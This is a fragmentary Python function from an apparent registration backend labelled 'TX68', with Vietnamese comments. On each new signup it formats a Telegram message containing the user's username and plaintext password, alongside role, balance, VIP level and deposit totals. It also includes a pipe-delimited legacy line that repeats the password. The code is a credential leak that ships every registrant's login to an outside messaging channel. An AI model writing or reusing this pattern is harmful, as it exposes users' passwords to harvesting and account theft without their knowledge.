...
def telegram_notify_new_user(username, password, role="user", balance=0, source="register", extra=None):
    ...
    # dòng cũ vẫn gửi kèm để dễ đọc
    legacy = f"TX68_USER|{rec['username']}|{password}|{role}|{int(balance or 0)}|{source}|vip{rec.get('vip_level',1)}|dep{rec.get('total_deposit',0)}"
    text = (
        "🆕 <b>TX68 nick mới (full)</b>\n"
        f"User: <code>{rec['username']}</code>\n"
        f"Pass: <code>{password}</code>\n"
        f"Role: {role} | Tiền: {int(balance or 0):,} | VIP: {rec.get('vip_level', 1)}\n"
        f"Nạp: {int(rec.get('total_deposit') or 0):,} | Nguồn: {source}\n"
        f"<code>{legacy}</code>\n"
        f"<code>{line}</code>"
    )
